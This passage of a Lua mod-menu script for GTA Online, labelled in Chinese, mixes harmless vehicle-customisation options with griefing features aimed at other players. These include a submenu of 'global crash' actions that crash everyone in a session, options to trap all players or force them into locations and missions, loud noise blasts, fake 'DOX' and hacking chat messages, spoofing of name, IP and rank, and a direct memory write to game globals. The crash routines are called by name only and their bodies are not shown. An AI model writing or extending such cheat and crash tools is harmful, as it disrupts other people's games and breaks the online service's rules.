        Changecolor(players.user(), pcolor)
end)

menu.list_select(pcolm, '二次色', {''}, '更改车辆的次要颜色', Mainc, 1, 
function (t)
    pcolor.sec = t - 1
        Changecolor(players.user(), pcolor)
end)

menu.list_select(pcolm, '珠光色', {''}, '更改载具上的珠光颜色', Mainc, 1, 
function (t)
    pcolor.per = t - 1
        Changewhepercolor(players.user(), pcolor)
end)

menu.list_select(pcolm, '车轮颜色', {''}, '更改车辆上的车轮颜色', Mainc, 1, 
function (t)
    pcolor.whe = t - 1
        Changewhepercolor(players.user(), pcolor)
end)

menu.list_select(pcolm, '内饰颜色', {''}, '更改车辆的内部颜色', Mainc, 1, 
function (t)
    pcolor.int = t - 1
        Changeintcolor(players.user(), pcolor.int)
end)

menu.list_select(pcolm, '仪表板颜色', {''}, '更改车辆上的仪表板颜色', Mainc, 1, 
function (t)
    pcolor.das = t - 1
        Changedashcolor(players.user(), pcolor.das)
end)

menu.list_select(plighm, '霓虹灯', {''}, '将霓虹灯更改为不同的颜色', Mainc, 1, 
function(c)
    local ncolor = c - 1
        Changeneon(players.user(), ncolor)
end)

menu.list_select(plscm, '窗口色调', {''}, '改变车辆的色调', Til, 1, 
function (t)
    local tint = t - 1
        Changetint(players.user(), tint)
end)

menu.list_select(plighm, '头灯', {''}, '将大灯更改为不同的颜色', Lighc, 1, 
function(c)
    local hcolor = c - 1

        Changehead(players.user(), hcolor)

end)


local pnrgb = {color= {r= 0, g = 1, b = 0, a = 1}}

menu.action(plighm, '改变 RGB 霓虹灯', {}, '将霓虹灯的颜色更改为您选择的 RGB', function ()
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    RGBNeonKit(pedm)
    local red = pnrgb.color.r * 255
    local green = pnrgb.color.g * 255
    local blue = pnrgb.color.b * 255
    VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
end)

menu.colour(plighm, 'RGB 霓虹色', {'rgbsc'}, '选择霓虹灯的颜色更改为', pnrgb.color, false, function(ncolor)
    pnrgb.color = ncolor
end)

menu.list_select(pwmenu, '本尼斯定制', {''}, '将车轮更换为 Bennys Bespoke 车轮', Bbw, 1, 
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 9, wheel)
end)

menu.list_select(pwmenu, '本尼原件', {''}, '将车轮更换为 Bennys Originals 车轮', Bow, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 8, wheel)

end)

menu.list_select(pwmenu, '自行车', {''}, '将车轮改为自行车（摩托车）车轮', Bw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 6, wheel)

end)

menu.list_select(pwmenu, '高端', {''}, '将车轮更改为高端车轮', Hew, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 7, wheel)
end)


menu.list_select(pwmenu, '低骑者', {''}, '将车轮更改为 Lowrider 车轮', Lw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 2, wheel)
    
end)

menu.list_select(pwmenu, '肌肉', {''}, '将轮子改为肌肉轮', Mw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 1, wheel)

end)

menu.list_select(pwmenu, '越野', {''}, '将车轮更改为越野车轮', Orw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 4, wheel)
end)


menu.list_select(pwmenu, '赛车（一级方程式车轮）', {''}, '将车轮更改为赛车（一级方程式车轮）车轮', Rw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 10, wheel)
end)


menu.list_select(pwmenu, '运动', {''}, '将车轮更改为运动车轮', Spw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 0, wheel)
end)


menu.list_select(pwmenu, '街道', {''}, '将车轮更改为街道车轮', Stw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 11, wheel)
end)


menu.list_select(pwmenu, '越野车', {''}, '将车轮改为 SUV 车轮', Suw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 3, wheel)
    
end)

menu.list_select(pwmenu, '曲目', {''}, '将轮子更改为履带轮', Trw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 12, wheel)
end)


menu.list_select(pwmenu, '调谐器', {''}, '将车轮更改为调谐器车轮', Tuw, 1,
function(w)
    local wheel = w - 1
        Changewheel(players.user(), 5, wheel)
end)

local pwinmenu = menu.list(carfly, '车窗', {}, '')

menu.action(pwinmenu, '卷起所有窗口', {'upwin'}, '立即卷起所有窗口', function ()
        Rollaup(players.user())
end)

menu.action(pwinmenu, '滚下所有窗户', {'downwin'}, '立即卷起所有窗口', function ()
        Rolladown(players.user())
end)

local winmen = menu.list(pwinmenu, '上下卷窗', {''}, '上下滚动单个窗口')
        
for index, name in ipairs(Windows) do
    menu.toggle(winmen, '向上或向下滚动 '..name, {''}, '向上或向下滚动 '..name, function (on)
        local win = index - 1
        local curcar = entities.get_user_vehicle_as_handle()
        local winup= on
        if winup ~= nil then
            if winup then
                VEHICLE.ROLL_DOWN_WINDOW(curcar, win)
            else
                VEHICLE.ROLL_UP_WINDOW(curcar, win)
            end
        end
    end)
end

local speedometer_plate_root = menu.list(carfly, "车速表板", {}, "将车牌文本设置为车辆的当前速度。")

mph_plate = false
menu.toggle(speedometer_plate_root, "车速表板", {}, "将车牌文本设置为车辆的当前速度。", function(on)
    mph_plate = on
    if on then
        if player_cur_car ~= 0 then
            original_plate = VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car)
        else
            notification("启动时您不在车内。您将无法还原车牌文本。")
            original_plate = "baibai"
        end
    else
        if player_cur_car ~= 0 then
            if original_plate == nil then
                original_plate = "baibai"
            end
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car, original_plate)
        end
    end
end)

menu.toggle(carfly, '车辆生成', {'Valiases'}, '激活用于生成的车辆名称别名列表，如果多人运行它，您可以使用它来关闭它', function (on)
    valiases_spawn.vehicle_alias = on
end)

valiases_spawn.vehicle_aliases = menu.list(carfly, '车辆生成列表', {}, '用于生成的车辆名称别名列表')
veh_spawn_see()

mph_unit = "KPH"
menu.list_action(speedometer_plate_root, "速度单位", {}, "", {"KPH", "MPH"}, function(index, value, click_type)
    mph_unit = value
end)

local chauffeur_root = menu.list(carfly, "司机服务", {}, "呼叫您的私人司机.")

menu.list_action(chauffeur_root, "传唤司机", {"summonchauffeur"}, "", {"Stretch", "T20", "Kuruma"}, function(index, value, click_type)
    summ_car(index, value)
end)

menu.action(chauffeur_root, "驾车前往航点", {}, "", function(click_type)
    summ_car_topoint()
end)

menu.action(chauffeur_root, "传送到驾驶室", {}, "", function(click_type)
    summ_car_tp()
end)

menu.action(chauffeur_root, "自我毁灭", {}, "", function(click_type)
    summ_car_bmob()
end)

local vehicle_fly = menu.list(carfly, "载具飞行", {}, "")

menu.toggle_loop(carfly, "载具效果", {}, "", function ()
    cargoodeffect()
end)

menu.textslider_stateful(carfly,"设置载具效果", {}, "", carvis, function (index)
    set_carvis(index) 
end)

local fastTurnVehicleScale = 3

menu.toggle_loop(carfly, "车辆快速自定义转弯", {}, "用 A/D 键快速转动您的车辆。", function ()
    FastTurnVehicleWithKeys(fastTurnVehicleScale)
end)

menu.slider(carfly, "车辆快速自定义转弯刻度（/10)", {}, "设置自定义转弯的比例。", 1, 1000, 30, 5, function(value)
    fastTurnVehicleScale = value / 10
end)

menu.toggle_loop(carfly, "隐藏载具无敌", {}, "不会被大多数菜单检测", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
end)

local rgbvm = menu.list(carfly, '彩虹载具', {}, '')

menu.toggle_loop(rgbvm, '彩虹载具', {}, '将载具颜色和霓虹灯更改为彩色', function ()
    rainbow_car()
end)

menu.slider(rgbvm, '速度', {''}, '调整车漆颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_rainbowcar(c)
end)

menu.toggle_loop(rgbvm, '彩虹大灯', {}, '将霓虹灯/大灯/内饰更改为相同颜色', function ()
    rainbow_car_light()
end)
  
menu.slider(rgbvm, '速度', {''}, '调整灯光颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_light(c)
end)

menu.toggle_loop(carfly, "目标乘客能力", {}, "允许你射击载具内的其他乘客", function()
    hittheplayerincar()
end)

menu.toggle_loop(carfly, "快速上下车", {"fastvehcleenter"}, "更快地进入载具.", function()
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(carfly, "在下车时关闭无敌模式", {""}, "", function()
    if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(entities.get_user_vehicle_as_handle()) then
        if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true), true)
        end
    end
end)

noaccident = false
menu.toggle(carfly, "避免事故", {"accidentavoidance"}, "使用全新技术避免车祸。特斯拉认证。仍然需要具备一定的驾驶能力", function(on)
    if on then
        noaccident = true
        aa_thread()
    else
        noaccident = false
    end
end)

menu.toggle(carfly, '减少翘头', {'Rburnout'}, '使载具不容易翘头,主要针对于肌肉车的翘头减速', function (tog)
    PHYSICS.SET_IN_ARENA_MODE(tog)
end)

renderscorched = false
menu.toggle(carfly, "烤焦", {"renderscorched"}, "使你的车烧焦", function(on)
    if on then
        renderscorched = true
    else
        renderscorched = false
        if player_cur_car ~= 0 then
            ENTITY.SET_ENTITY_RENDER_SCORCHED(player_cur_car, false)
        end
    end
end, false)

menu.action(carfly, "强行离开载具", {"forceleaveveh"}, "紧急情况下强行离开车辆", function(click_type)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
    TASK.TASK_LEAVE_ANY_VEHICLE(players.user_ped(), 0, 16)
end)

menu.click_slider(carfly, "设置脏污级别", {"setdirtlevel"}, "", 0, 15, 0, 1, function(s)
    setcardirty(s)
end)

menu.click_slider(carfly, "垂直堆叠", {"stackvehvert"}, "", 1, 10, 3, 1, function(s)
    setstacky(s)
end)

menu.click_slider(carfly, "水平堆叠", {"stackvehhoriz"}, "", 1, 10, 3, 1, function(s)
    setstackx(s)
end)

menu.toggle_loop(carfly, "随机升级", {}, "仅适用于您出于某种原因生成的车辆", function()
    ramdomupdatecar()
end)

menu.toggle_loop(carfly, "强制生成反制系统", {"forcecms"}, "当您使用鸣笛键时,在任何载具中强制执行反制系统", function(on)
    forcecmsoncar()
end)

menu.action(carfly, "特斯拉召唤", {"teslasummon"}, "让你的车自动开过来。由于多种原因经常中断,但这太有趣了,不能放弃。", function(click_type)
    teslasummoncar()
end)

menu.toggle_loop(carfly, "喇叭轰炸", {"lshornspam"}, "", function(toggle)
    carlshormspam()
end)

menu.slider(carfly, "换座位", {""}, "驾驶座 = -1 副驾驶 = 0 左后 = 1 右后 = 2", -1, 2, -1, 1, function(seatnumber)
	changecarsit(seatnumber)
end)

menu.toggle(vehicle_fly, "载具飞行", {"vehfly"}, "我建议为此选项设置热键。", function(on_click)
    is_vehicle_flying = on_click
end)

menu.slider(vehicle_fly, "速度", {"speed"}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(vehicle_fly, "触发后不停止", {"dontstop"}, "", function(on_click)
    dont_stop = on_click
end)

menu.toggle(vehicle_fly, "无碰撞", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)


util.create_tick_handler(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE); end
    return true
end)
util.on_stop(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true)
	ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE);
end)
 

local bodyguardMenu <const> = BodyguardMenu.new(menu.my_root(), "保镖菜单", {})


visuals = menu.list(menu.my_root(), "视觉效果", {}, "")

menu.click_slider(visuals, "醉酒模式", {}, "", 0, 5, 1, 1, function(val)
    drunkmode(val)
end)

visual_setting()

custselc = menu.list(menu.my_root(), "全局选项", {}, "", function(); end)

local allcrash = menu.list(custselc, "全局崩溃", {}, "", function(); end)

local allguyssound = menu.list(custselc, "全局声音", {}, "", function(); end)

local allevent = menu.list(custselc, "全局事件", {}, "", function(); end)

apforcedacts_root = menu.list(custselc, "强迫载具行动", {"apforcedacts"}, "")

menu.action(apforcedacts_root, "传送载具到我", {"tpavtome"}, "这可能有效，也可能无效。如果这不起作用，它不是一个bug", function(on_click)
    tp_all_player_cars_to_coords(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
end)

forceteleplace()


    local antichatspam = menu.list(custselc, '反聊天轰炸', {}, '')

    local messageTable = {}
    chat.on_message(function(pid, message_sender, text, team_chat)
        if pid == players.user() then return end
        if not chatSpamSettings.enabled then return end
        if team_chat and chatSpamSettings.ignoreTeam then return end

        if messageTable[pid] == nil then
            messageTable[pid] = {}
        end

        local messageCount = (#messageTable[pid] != nil and #messageTable[pid] or 0)
        messageTable[pid][messageCount + 1] = text

        if #messageTable[pid] < chatSpamSettings.identicalMessages then return end
        for i = 1, #messageTable[pid] - 1 do
            if messageTable[pid][#messageTable[pid]] != messageTable[pid][#messageTable[pid] - i] then
                messageTable[pid] = {}
                return
            end
            if i == #messageTable[pid] - 1 then
                menu.trigger_commands('kick'.. players.get_name(pid))
                util.toast('玩家' ..' '.. players.get_name(pid) ..' '.. '因聊天轰炸已被踢出')
            end
        end
    end)

    menu.toggle(antichatspam, '反聊天轰炸', {'JSantiChatSpam'}, '如果有人不断发送相同的聊天信息则踢他们.', function(toggle)
        chatSpamSettings.enabled = toggle
    end)

    menu.toggle(antichatspam, '忽略团队聊天', {'JSignoreTeamSpam'}, '', function(toggle)
        chatSpamSettings.enabled = toggle
    end, chatSpamSettings.ignoreTeam)

    menu.slider(antichatspam, '相同信息', {'JSidenticalChatMessages'}, '玩家在被踢之前可以发送多少条相同的聊天消息.', 2, 9999, chatSpamSettings.identicalMessages, 1, function(value)
        chatSpamSettings.identicalMessages = value
    end)

    local colouredotr = menu.list(custselc, '标记人间蒸发玩家', {}, '')

    menu.toggle_loop(colouredotr, '标记人间蒸发玩家', {'JScolouredOtrReveal'}, '用彩色光点标记人间蒸发的玩家.', function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if players.is_otr(pid) and not markedPlayers[pid] then
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                markedPlayers[pid] = HUD.ADD_BLIP_FOR_ENTITY(ped)
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
                HUD.SHOW_HEADING_INDICATOR_ON_BLIP(markedPlayers[pid], true)
            elseif players.is_otr(pid) then
                HUD.SET_BLIP_COLOUR(markedPlayers[pid], otrBlipColour)
            elseif not players.is_otr(pid) and markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end, function()
        local playerList = players.list(false, true, true)
        for i, pid in pairs(playerList) do
            if markedPlayers[pid] then
                util.remove_blip(markedPlayers[pid])
                markedPlayers[pid] = nil
            end
        end
    end)

    local otr_colour_slider = menu.slider(colouredotr, '人间蒸发 显示颜色', {'JSortRevealColour'}, '',1, 81, otrBlipColour, 1, function(value)
        otrBlipColour = value + (value > 71 and 1 or 0) + (value > 77 and 2 or 0)
    end)

    menu.toggle_loop(colouredotr, '人间蒸发 rgb颜色', {'JSortRgbReveal'}, '', function()
        menu.set_value(otr_colour_slider, (otrBlipColour == 84 and 1 or otrBlipColour + 1))
        util.yield(250)
    end)

    menu.action(allevent, "发送所有玩家海滩", {}, "", function () 
        sendscriptevent_one()
    end)

    menu.action(allevent, "发送所有玩家岛屿", {}, "", function () 
        sendscriptevent_two()
    end)

    menu.action(allevent, "全局公寓邀请", {}, "", function () 
        sendscriptevent_three()
    end)

    menu.action(allevent, "全局送进任务", {}, "", function () 
        sendscripptevent_five()
    end)

    menu.action(allevent, "困住所有玩家", {}, "", function () 
        sendscriptevent_four()
    end)

    menu.action(allguyssound, "防空警报", {"AirDefencesSound"}, "", function()
        fangkongjingbao()
    end)
            
    menu.action(allguyssound, "噪音", {"bedsound", "earrape"}, "在战局中播放大量的噪音", function()
        zaoyin()
    end)

    menu.action(allcrash, "载具伞崩全局", {}, "崩溃全局", function ()
        carcrashv1()
    end)

    menu.action(allcrash, "人物伞崩全局V1", {}, "崩溃全局", function()
        personlcrashv1()
    end)

    menu.action(allcrash,"人物伞崩全局V2",{},"崩溃全局",function()
        personalcrashv2()
    end)

    menu.action(allcrash,"人物伞崩全局V3",{},"崩溃全局",function()
        personalcrashv3()
    end)

    menu.action(allcrash, "人物伞崩全局V4", {}, "慎用,可能会自崩", function()
        personalcrashv4()
    end)

    menu.action(allcrash,"人物伞崩全局V5",{},"崩溃所有玩家",function()
        personalcrashv5()
    end)

    menu.action(allcrash, "耶稣的救赎", {}, "", function ()
        jesus_help_me()
    end)

    menu.action(allcrash,"声音崩溃",{},"崩溃全局",function()
        soundcrash_all()
    end)

    menu.action(allcrash,"CARGO崩溃",{},"崩溃全局",function()
        CARGO()
    end)

    menu.action(allcrash,"冷战崩溃",{},"崩溃全局",function()
        rlengzhan()
    end)

    menu.action(allcrash, "大春逗崩溃", {""}, "", function(on_toggle)
        big_pussy()
    end)

    menu.action(allcrash, "大自然全局崩溃", {}, "", function()
        natural_crash_all()
    end) 

    menu.toggle_loop(allcrash, "董哥崩溃", {}, "有bug,停不下来请关闭脚本并自杀", function(on)
        dgcrash()
    end)
	
	menu.action(allcrash, "不知名崩", {}, "", function()
        nothingcrash()
    end)	

    menu.action(allguyssound, "声音", {"bedsound", "earrape"}, "在战局中播放大量的声音", function()
       zaoyin()
       util.yield(500)
       notification("~y~D'ooooooooooooooooh!!!!!!!!!",colors.blue)
    end)

	
-----------------------------------
-- Online
-----------------------------------

local onlinemode = menu.list(menu.my_root(), '线上模式', {'JSonline'}, '')

local online_funfeatures = menu.list(onlinemode, '线上玩乐', {}, '')

menu.action(online_funfeatures, '雪球大战', {}, '给战局中的每个人雪球并通过文字通知它们', function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        players.send_sms(plist[i], players.user(), '雪球大战!你获得了雪球')
        util.yield()
    end
end)

menu.action(online_funfeatures, '美国暴乱', {}, '给战局中的每个人提供烟花发射器并通过文字通知它们', function ()
    local plist = players.list()
    local fireworks = util.joaat('weapon_firework')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
        WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
        players.send_sms(plist[i], players.user(), '去你妈的美国!你获得了烟花')
        util.yield()
    end
end)

menu.toggle_loop(online_funfeatures, '金钱追踪', {}, '到处都是假钱袋', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local tar1 = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    Streamptfx('scr_exec_ambient_fm')
    if TASK.IS_PED_WALKING(targets) or TASK.IS_PED_RUNNING(targets) or TASK.IS_PED_SPRINTING(targets) then
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_ped_foot_banknotes', tar1.x, tar1.y, tar1.z - 1, 0, 0, 0, 1.0, true, true, true)
    end
    
end)

menu.action(online_funfeatures, '停止观看', {'sspect'}, '停止在战局里观看任何人', function ()
    Specon(players.user())
    Specoff(players.user())
end)

menu.toggle_loop(online_funfeatures, '增加虎鲸导向导弹射程', {'krange'}, '你现在可在地图的任何地方使用', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)


chat_presets_root = menu.list(onlinemode, "聊天预设", {"lancescriptchatpresets"},"聊天预设,为方便起见")

menu.action(chat_presets_root, "真实本地化 \"DOX\"", {}, "向每个人发送本地化的 \"DOX\" 。每个人都会认为你正在发出所有人的信息,而实际上,每个人都看到了自己的信息,没有人看到其他人。", function(click_type)
    showrealip()
end)

menu.action(chat_presets_root, "虚假的崩溃", {}, "发送本地化的假崩溃百分比条", function(click_type)
    chatcrash()
end)

menu.action(chat_presets_root, "虚假黑客", {}, "发出一个本地化的假黑入百分比条", function(click_type)
    fakechathacking()
end)

menu.action(chat_presets_root, "随机笑话", {"randomjoke"}, "随便讲个笑话。", function(click_type)
    ramdomjokelol()
end)

menu.toggle_loop(chat_presets_root, "随机笑话循环", {"randomjokeloop"}, "讲一个随机笑话，五秒循环一次", function(click_type)
    loopchatjoke()
end)
for k,v in pairs(chat_presets) do
    menu.action(chat_presets_root, k, {}, "\"" .. v .. "\"", function(click_type)
        chat.send_message(v, false, true, true)
    end)
end

randomizer_root = menu.list(onlinemode, "随机虚假器", {"lsrandomizer"}, "随机化Stand中的一些菜单数值.但是，这不会为您启用Stand中的选项； 它只会随机输入数值.")


menu.toggle(randomizer_root, "随机虚假名字", {}, "开启后切换战局才能生效.", function(on)
    ramdomfakename(on)
end)

menu.toggle(randomizer_root, "随机虚假IP", {}, "", function(on)
    ramdomfakeip(on)
end)

random_rank_spoof = false
menu.toggle(randomizer_root, "随机虚假等级", {}, "", function(on)
    ramdomfakelvl(on)
end)

menu.toggle_loop(randomizer_root, "虚假短信名称", {}, "", function(on)
    spamtextname(on)
end)

    local fakemoney = menu.list(onlinemode, '假钱', {'JSfakeMoney'}, '添加假钱,只能看不能花.')


        menu.action(fakemoney, '添加假钱', {'JSaddFakeMoney'}, '添加假钱1次.', function()
            addfakemoney()
        end)

        menu.toggle_loop(fakemoney, '循环假钱', {'JSloopFakeMoney'}, '设置循环添加钱的延迟.', function()
            loopaddfakemoney()
        end)

        menu.toggle(fakemoney, '显示"交易处理中"', {'JSfakeTransaction'}, '添加假钱的时候在右下角显示"交易处理中"的信息.', function(toggle)
            fakeMoneyTransactionPending = toggle
        end, fakeMoneyTransactionPending)

        local fakemoneyloopdelayasd = menu.list(fakemoney, '假钱循环延迟', {'JSexpDelay'}, '让您为假钱循环设置自定义延迟.')
        generateDelaySettings(fakemoneyloopdelayasd, '假钱循环延迟', fakeMoneyLoopDelay)

        menu.slider(fakemoney, '银行假钱', {'JSbankFakeMoney'}, '将会有多少假钱被添加到您的银行.', -2000000000, 2000000000, bankFakeMoney, 1, function(value)
            bankFakeMoney = value
        end)

        menu.slider(fakemoney, '现金假钱', {'JScashFakeMoney'}, '将会有多少假钱以现金形式添加.', -2000000000, 2000000000, cashFakeMoney, 1, function(value)
            cashFakeMoney = value
        end)

    local safemonitormode = menu.list(onlinemode, '保险箱监视器', {'JSsm'}, '保险箱监视器允许您监视您的保险箱. 它不会影响正在增加的钱')

    local safeMonitorToggle = false
    menu.toggle(safemonitormode, '启用监视', {'SMtoggleAllSelected'}, '启用监视所有已选择的选项.', function(toggle)
        safeMonitorToggle = toggle
    end)

    generateToggles(JS_tbls.safeManagerToggles, safemonitormode, false)

    local monitorsettings = menu.list(safemonitormode, '保险箱监视器设置', {'SMsettings'}, '屏幕文字信息设置')

    smSettings = new.hudSettings(-3, 0, 2)
    generateHudSettings(monitorsettings, 'SM', smSettings)


    local casinoasd = menu.list(onlinemode, '赌场', {'JScasino'}, '这里没有屏钱选项.')

    menu.toggle_loop(casinoasd, '幸运转盘冷却Lucky', {'JSlwCool'}, '告诉您幸运转盘是否可用或距离它还有多长冷却时间.', function()
        casinolucky()
    end)

    menu.action(casinoasd, '赌场 赢/输', {'JScasinoLP'}, '告诉您在赌场赚了多少或输了多少.', function()
        casinolp()
    end)

    local timetrialsasd = menu.list(onlinemode, '时间挑战赛', {'JStt'}, '')

    menu.divider(timetrialsasd, '时间挑战赛')

    menu.toggle_loop(timetrialsasd, '时间挑战赛 最佳记录', {'JSbestTT'}, '', function()
        besttime()
    end)

    menu.action(timetrialsasd, '传送到时间挑战赛', {'JStpToTT'}, '', function()
        tptotime()
    end)

    menu.divider(timetrialsasd, 'RC匪徒时间挑战赛')

    menu.toggle_loop(timetrialsasd, 'RC匪徒时间挑战赛 最佳记录', {'JSbestRcTT'}, '', function()
        bestrctime()
    end)

    menu.action(timetrialsasd, '传送到RC匪徒时间挑战赛', {'JStpToRcTT'}, '', function()
        tptorctime()
    end)


    local blockareas = menu.list(onlinemode, '阻挡区域', {'JSblock'}, '用隐形墙阻挡某些区域,让其他人无法进入. 但如果您在加入战局的时候使用它,它会让你崩溃哈哈.')

    menu.toggle_loop(blockareas, '自定义阻挡', {}, '使您能够通过按"B"来阻挡您面前的区域.', function()
        blocksomewhere()
    end)

    local blocklsc = menu.list(blockareas, '阻挡洛圣都改车王', {'JSblockLSC'}, '阻挡进入洛圣都改车王.')
    local blockcasino = menu.list(blockareas, '阻挡赌场', {'JSblockCasino'}, '阻挡进入赌场.')
    local jsblockcasino = menu.list(blockareas, '阻挡花园银行', {'JSblockCasino'}, '阻挡进入花园银行.')

    local blockAreasActions = {
        --Orbital block
        {root = blockareas, name = '天基炮发射室', coordinates = {{335.95837, 4834.216, -60.99977}}, blocked = false},
        -- Lsc blocks
        {root = blocklsc, name = '伯顿', coordinates = {{-357.66544, -134.26419, 38.23775}}, blocked = false},
        {root = blocklsc, name = 'LSIA', coordinates = {{-1144.0569, -1989.5784, 12.9626}}, blocked = false},
        {root = blocklsc, name = '梅萨', coordinates = {{721.08496, -1088.8752, 22.046721}}, blocked = false},
        {root = blocklsc, name = '布莱恩县', coordinates = {{115.59574, 6621.5693, 31.646144}, {110.460236, 6615.827, 31.660228}}, blocked = false},
        {root = blocklsc, name = '佩立托湾', coordinates = {{115.59574, 6621.5693, 31.646144}, {110.460236, 6615.827, 31.660228}}, blocked = false},
        {root = blocklsc, name = '本尼车坊', coordinates = {{-205.6571, -1309.4313, 31.093222}}, blocked = false},
        -- Casino blocks
        {root = blockcasino, name = '赌场入口', coordinates = {{924.3438, 49.19933, 81.10636}, {922.5348, 45.917263, 81.10635}}, blocked = false},
        {root = blockcasino, name = '赌场车库', coordinates = {{935.29553, -0.5328601, 78.56404}}, blocked = false},
        {root = blockcasino, name = '幸运转盘', coordinates = {{1110.1014, 228.71582, -49.935845}}, blocked = false},
        --Maze bank block
        {root = jsblockcasino, name = '花园银行入口', coordinates = {{-81.18775, -795.82874, 44.227295}}, blocked = false},
        {root = jsblockcasino, name = '花园银行车库', coordinates = {{-77.96956, -780.9376, 38.473335}, {-82.82901, -781.81635, 38.50093}}, blocked = false},
        --Mc block
        {root = blockareas, name = '霍伊会所', coordinates = {{-17.48541, -195.7588, 52.370953}, {-23.452509, -193.01324, 52.36245}}, blocked = false},
        --Arena war garages
        {root = blockareas, name = '竞技场车库', coordinates = {
            {-362.912, -1870.2249, 20.527836}, {-367.41855, -1872.5348, 20.527836},
            {-375.58344, -1874.6719, 20.527828},  {-379.9853, -1876.0894, 20.527828},
            {-386.49762, -1880.2793, 20.527842},  {-390.3558, -1883.0833, 20.527842},
            {-396.9259, -1883.9537, 21.542086}
        }, blocked = false},
    }
        
    
    for i = 1, #blockAreasActions do
        local areaName = blockAreasActions[i].name
        menu.action(blockAreasActions[i].root, '阻挡' ..' '.. areaName, {}, '', function ()
            if not blockAvailable(blockAreasActions[i].blocked, (areaName == '洛圣都国际机场' and areaName or string.capitalize(areaName))) then return end
            setBlockStatus(true)
            blockAreasActions[i].blocked = true
            for j = 1, #blockAreasActions[i].coordinates do
                block(blockAreasActions[i].coordinates[j])
            end
            setBlockStatus(false, areaName)
        end)
    end


local services <const> = menu.list(onlinemode, "服务", {}, "")


menu.action(services, "即时纳米无人机", {}, "", function()
    nanodrone()
end)

menu.action(services, "请求豪华直升机", {}, "", function()
    luxuryhelicopter()
end)

menu.action(services, "即时RC匪徒", {}, "", function()
    bandito()
end)

menu.action(services, "即时遥控RC坦克", {}, "", function ()
    rctank()
end)

TeleRoot = menu.list(onlinemode, '传送', {}, '')

Proptp = menu.list(TeleRoot, '资产传送', {'tpprop'}, '传送到所拥有的资产', function()
    tp_prop()
end)

local vteles = menu.list(TeleRoot, '载具传送', {}, '')

menu.action(vteles, '传送到复仇者', {'tpaven'}, '传送到设施', function ()
    tp_aven()
end)

menu.action(vteles, '传送到虎鲸', {'tpkosatka'}, '传送到佩里科岛抢劫面板', function ()
    tp_kosa()
end)

menu.action(vteles, '传送到机动作战中心', {'tpMOC'}, '传送到地堡', function ()
    tp_moc()
end)

menu.action(vteles, '传送到恐霸', {'tpterro'}, '传送到夜总会', function ()
    tp_terro()
end)

local cargoteles = menu.list(TeleRoot, 'CEO仓库传送', {}, '')

